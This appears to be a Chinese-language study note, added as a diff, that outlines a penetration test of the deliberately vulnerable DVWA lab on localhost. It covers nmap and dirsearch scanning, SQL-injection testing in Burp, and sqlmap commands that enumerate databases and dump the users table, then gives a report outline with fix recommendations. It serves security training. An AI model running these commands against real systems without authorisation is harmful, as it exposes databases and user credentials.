@@ -1,0 +1,82 @@
+========================================
+渗透测试流程 + 常用命令
+========================================
+
+【第一步：信息收集】
+
+1. 扫端口（Nmap）
+   nmap -sV -p 80,3306 127.0.0.1
+
+2. 扫目录（dirsearch）
+   dirsearch -u http://localhost/dvwa/
+
+3. 看目标有哪些目录，哪些能打开，哪些被禁止。
+
+
+【第二步：漏洞发现】
+
+1. 用 Burp 抓包
+   - 打开 Burp，Proxy → Intercept，设成 off
+   - 用 Burp 自带浏览器访问 DVWA
+   - 登录后，在 SQL Injection 页面输入 1，点 Submit
+   - 切回 Burp，Proxy → HTTP history，找 GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+
+2. 发到 Repeater
+   - 右键 → Send to Repeater
+   - 在 Repeater 里，把 id=1 改成 id=1'
+   - 点 Send
+   - 看响应里有没有 SQL 语法错误（说明存在注入）
+
+
+【第三步：漏洞利用（sqlmap）】
+
+1. 进 sqlmap 目录
+   cd /d D:\DT200\sqlmap-master\sqlmap-master
+
+2. 列出所有数据库
+   python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=你的session; security=low" --dbs
+
+3. 列出指定数据库的表
+   python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=你的session; security=low" -D dvwa --tables
+
+4. 列出指定表的字段
+   python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=你的session; security=low" -D dvwa -T users --columns
+
+5. 拖出表里的数据
+   python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=你的session; security=low" -D dvwa -T users --dump
+
+
+【第四步：写报告】
+
+把上面三步的过程和结果，写成一篇渗透测试报告。
+包括：
+- 目标
+- 信息收集结果
+- 漏洞发现过程
+- 漏洞利用结果
+- 修复建议
+
+
+【常用工具速查】
+
+Nmap：
+- 扫端口：nmap -sV -p 80,3306 127.0.0.1
+- 扫网段：nmap -sn 192.168.1.0/24
+
+dirsearch：
+- 扫目录：dirsearch -u http://localhost/dvwa/
+
+sqlmap：
+- 列数据库：--dbs
+- 列表：-D 数据库名 --tables
+- 列字段：-D 数据库名 -T 表名 --columns
+- 拖数据：-D 数据库名 -T 表名 --dump
+
+Burp：
+- Proxy：抓包
+- Repeater：改参数重发
+- Intruder：爆破
+- Decoder：编码/解码
+- Comparer：对比差异
+
+========================================
